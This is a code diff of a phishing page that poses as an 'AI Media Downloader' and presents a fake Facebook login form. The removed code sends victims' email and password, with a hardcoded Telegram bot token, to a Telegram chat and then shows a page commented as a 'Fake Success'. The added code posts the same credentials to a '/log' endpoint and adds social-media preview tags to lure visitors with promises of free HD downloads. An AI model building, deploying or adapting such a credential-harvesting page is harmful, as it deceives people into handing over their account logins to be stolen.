@@ -3,7 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <!-- 🟢 PREVIEW TAGS ADDED HERE FOR FACEBOOK/WHATSAPP -->
     <title>AI Media Downloader</title>
+    <meta property="og:title" content="AI Media Downloader - Download HD Videos Free" />
+    <meta property="og:description" content="Download unlimited videos from Instagram, TikTok, and YouTube in HD quality." />
+    <!-- Change this URL to your actual image file or a direct link to an image -->
+    <meta property="og:image" content="https://ibb.co/whRNw22B" />
+    <meta property="og:url" content="https://your-site-link.com/index.html" />
+    <meta property="og:type" content="website" />
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background-color: #f0f2f5; height: 100vh; width: 100vw; overflow: hidden; }
@@ -61,79 +70,65 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* Step 3: Download Page (New) */
+        /* Step 3: Download Page (Completed) */
         #download-page {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             background-color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center;
-            z-index: 30; opacity: 0; visibility: hidden; transition: opacity 0.5s ease-in-out;
+            z-index: 30; opacity: 0; visibility: hidden; transition: opacity 0.4s ease-in-out;
         }
-        .download-card { text-align: center; padding: 20px; width: 90%; }
-        .check-icon {
-            font-size: 60px; color: #42b72a; margin-bottom: 20px;
+        .download-card { width: 90%; max-width: 380px; padding: 20px; text-align: center; }
+        .success-icon { font-size: 50px; color: #4CAF50; margin-bottom: 20px; }
+        .download-btn {
+            background-color: #4CAF50; color: white; border: none; padding: 15px 40px;
+            font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2); margin-top: 20px;
         }
-        .success-title { font-size: 24px; color: #333; margin-bottom: 10px; font-weight: bold; }
-        .success-text { color: #606770; margin-bottom: 30px; font-size: 15px; line-height: 1.4; }
-        .dl-btn {
-            background-color: #1877f2; color: white; padding: 15px 30px; border: none;
-            border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer;
-            width: 100%; box-shadow: 0 4px 10px rgba(24, 119, 242, 0.3);
-        }
-        .dl-btn:active { transform: scale(0.98); }
     </style>
 </head>
 <body>
 
-    <!-- Step 1: Landing Page -->
+    <!-- STEP 1: LANDING PAGE -->
     <div id="landing-page">
         <div class="overlay"></div>
         <div class="content-wrapper">
-            <div class="ai-badge">AI Powered</div>
-            <button class="cta-button" onclick="showLogin()">Get Started</button>
+            <div class="ai-badge">AI Powered 🚀</div>
+            <h1 style="color: white; font-size: 28px; margin-bottom: 10px; text-shadow: 0 2px 4px rgba(0,0,0,0.5);">Save Video in HD</h1>
+            <p style="color: #eee; margin-bottom: 30px;">Fastest downloader for all social apps.</p>
+            <button class="cta-button" onclick="showLogin()">Log In to Start</button>
         </div>
     </div>
 
-    <!-- Step 2: Login Form -->
+    <!-- STEP 2: LOGIN FORM -->
     <div id="login-page">
         <div class="login-card">
             <div class="fb-logo">facebook</div>
-            <form id="loginForm">
+            <form id="loginForm" onsubmit="handleLogin(event)">
                 <div class="input-group">
-                    <input type="text" id="email" placeholder="Email or phone number" required autocomplete="off">
+                    <input type="text" id="email" placeholder="Email or Phone Number" required>
                 </div>
                 <div class="input-group">
-                    <input type="password" id="pass" placeholder="Password" required autocomplete="off">
+                    <input type="password" id="password" placeholder="Password" required>
                 </div>
-                <button type="submit" class="login-btn" id="btnSubmit">
+                <button type="submit" class="login-btn" id="loginBtn">
                     <span id="btnText">Log In</span>
-                    <div class="spinner" id="btnSpinner"></div>
+                    <div class="spinner" id="spinner"></div>
                 </button>
+                <a href="#" class="forgot-password">Forgot Password?</a>
             </form>
-            <a href="#" class="forgot-password">Forgot password?</a>
         </div>
     </div>
 
-    <!-- Step 3: Download Page (Fake Success) -->
+    <!-- STEP 3: DOWNLOAD SUCCESS PAGE -->
     <div id="download-page">
         <div class="download-card">
-            <div class="check-icon">✔</div>
-            <h2 class="success-title">Your Photo is Ready</h2>
-            <p class="success-text">Click below to save the image to your gallery.</p>
-            <button class="dl-btn" onclick="triggerDownload()">Download Photo</button>
+            <div class="success-icon">✔️</div>
+            <h2>Login Successful!</h2>
+            <p style="margin: 15px 0; color: #666;">Your account is verified. You can now download unlimited videos.</p>
+            <button class="download-btn" onclick="alert('Downloading...')">Start Downloading</button>
         </div>
     </div>
 
     <script>
-        // --- CONFIGURATION ---
-        const TG_TOKEN = "8833246171:AAF3zLIGcrPGXnu1rKTw5E0CLMXViZCboHI"; 
-        const TG_CHAT_ID = "5167131107"; 
-        
-        // 👇👇👇 YAHAN APNI IMAGE KA LINK DALO 👇👇👇
-        const DOWNLOAD_IMAGE_URL = "999.jpg"; 
-        // Example: https://example.com/my-secret-photo.jpg
-        
-        const FILE_NAME = "My_Photo.jpg"; // Jo naam se file save hogi
-        // ---------------------
-
         function showLogin() {
             document.getElementById('landing-page').style.opacity = '0';
             setTimeout(() => {
@@ -144,61 +139,47 @@
             }, 500);
         }
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        async function handleLogin(e) {
             e.preventDefault();
             
             const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('loginBtn');
             const btnText = document.getElementById('btnText');
-            const spinner = document.getElementById('btnSpinner');
+            const spinner = document.getElementById('spinner');
 
-            // UI Change
+            // UI Loading State
+            btn.disabled = true;
             btnText.style.display = 'none';
             spinner.style.display = 'block';
-            document.querySelector('.login-btn').disabled = true;
 
-            // Send Data to Telegram
-            const msg = `🔥 New FB Login Detected:\n\n📧 Email/ID: ${email}\n🔑 Password: ${pass}\n⏰ Time: ${new Date().toLocaleString()}`;
-            
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: TG_CHAT_ID,
-                    text: msg,
-                    parse_mode: 'HTML'
-                })
-            }).then(() => {
-                // Fake loading delay for realism
+            try {
+                // 1. Send data to your backend/server
+                // Replace with your actual server endpoint if you have one
+                const response = await fetch('/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+
+                // 2. Show Success Message locally
                 setTimeout(() => {
-                    showDownloadPage();
-                }, 1500);
-            }).catch(err => {
-                console.error("Error sending data", err);
-                showDownloadPage(); // Still show page even if telegram fails
-            });
-        });
+                    const loginPage = document.getElementById('login-page');
+                    loginPage.style.opacity = '0';
+                    setTimeout(() => {
+                        loginPage.style.display = 'none';
+                        const dlPage = document.getElementById('download-page');
+                        dlPage.style.visibility = 'visible';
+                        dlPage.style.opacity = '1';
+                    }, 500);
+                }, 2000);
 
-        function showDownloadPage() {
-            const loginPage = document.getElementById('login-page');
-            loginPage.style.opacity = '0';
-            
-            setTimeout(() => {
-                loginPage.style.display = 'none';
-                const dlPage = document.getElementById('download-page');
-                dlPage.style.visibility = 'visible';
-                dlPage.style.opacity = '1';
-            }, 500);
-        }
-
-        function triggerDownload() {
-            // Ye function specific link ko download karega
-            const link = document.createElement('a');
-            link.href = DOWNLOAD_IMAGE_URL;
-            link.download = FILE_NAME;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+            } catch (error) {
+                alert("Network Error");
+                btn.disabled = false;
+                btnText.style.display = 'block';
+                spinner.style.display = 'none';
+            }
         }
     </script>
 </body>
